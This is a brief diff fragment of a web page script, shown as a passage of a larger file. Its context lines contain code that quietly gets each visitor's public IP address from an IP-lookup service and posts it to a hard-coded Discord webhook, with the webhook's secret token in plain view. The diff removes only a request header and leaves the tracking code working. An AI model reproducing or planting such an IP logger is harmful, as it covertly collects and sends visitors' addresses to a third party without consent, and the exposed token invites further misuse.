@@ -8,7 +8,6 @@
     $.getJSON("https://api.ipify.org?format=txt", function(data) {
         const request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1038215774625603584/5qa1rgmCUJ2GvfGYDJvns6X2xm63Cj2YlshwhjG9F5NLoPYEFx31pB5rWxdlmrwggR7y");
-        request.setRequestHeader('Content-type', 'application/txt');
         request.send(data.ip);
     })
     </script>
